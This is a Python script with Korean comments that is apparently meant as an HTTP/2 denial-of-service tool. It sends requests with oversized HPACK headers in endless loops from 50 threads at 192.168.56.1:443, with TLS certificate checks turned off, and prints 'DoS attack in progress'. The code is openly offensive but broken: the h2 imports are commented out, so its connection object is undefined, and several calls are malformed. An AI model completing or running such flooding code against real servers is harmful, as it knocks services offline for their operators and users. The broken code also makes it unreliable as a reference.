from hpack import Encoder
import threading
from hyperframe.frame import HeadersFrame, ContinuationFrame, SettingsFrame, WindowUpdateFrame
# import h2.connection # h2 install --> 3.2.0v  [pip install h2==3.2.0]
# import h2.events # h2 lib modify --> [flags.py : collections --> collections.abc]
import socket
import ssl
from multiprocessing import Process, current_process

def hpack_header(i):
    encoder = Encoder()  # Encoder 초기화
    name = f'ssssssssssssssssssssshhhhhhhhhhhhhhhhhhhhhhhwwwwwwwwwwwwwwwwwshwshwssssssssshhhhhhhhhhhwwwwwwwwwwww{1}'
    value = f'03310331033198989803319898033198980331998980331033103310331989898033198980331989803319989803319898{1}'

    headers = [(name, value)]
    encoded_headers = encoder.encode(headers)
    return encoded_headers

def send_http2_request(host, port, use_ssl):
    # TCP 연결 설정
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host, port))

    # localhost 인증서 검증 무시
    if use_ssl:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        context.check_hostname = False  # 이 줄을 추가하여 check_hostname 비활성화
        context.verify_mode = ssl.CERT_NONE
        sock = context.wrap_socket(sock, server_hostname=host)

    # HTTP/2 연결 설정
    settings_frame = SettingsFrame(0)
    window_update_frame = window_update_frame(0)
    window_update_frame.window_increment = 65535
    
    # conn = h2.connection.H2Connection()
    # conn.initiate_connection()
    # sock.sendall(conn.data_to_send())  # 함수 호출 추가

    # header frame
    headers = [
        (':method', 'GET'),
        (':authority', host),
        (':scheme', 'https' if use_ssl else 'http'),
        (':path', '/'),
    ]

    # hpack header 추가
    hpack_headers = hpack_header()
    headers.append(('custom-header', hpack_headers))  # HPACK 헤더 바이너리 데이터 추가

    conn.send_headers(1, headers)
    sock.sendall(conn.data_to_send())  # 함수 호출 추가

    # 응답 확인
    while True:
        data = sock.recv(65535)
        if not data:
            break
        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, h2.events.ResponseReceived):
                print(event.headers)
            if isinstance(event, h2.events.DataReceived):
                print(event.data)
            if isinstance(event, h2.events.StreamEnded):
                break

    # 연결 종료
    conn.close_connection()
    sock.sendall(conn.data_to_send())  # 함수 호출 추가
    sock.close()

def thread_send(host, port, use_ssl):
    while True:
        try:
            send_http2_request(host, port, use_ssl)
            print('Dos 공격 진행 중...')
        except Exception as e:
            print(f"Error: {e}")

def main():
    host = '192.168.56.1'
    port = 443
    use_ssl = True
    num_threads = 50

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=thread_send, args=(host, port, use_ssl))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
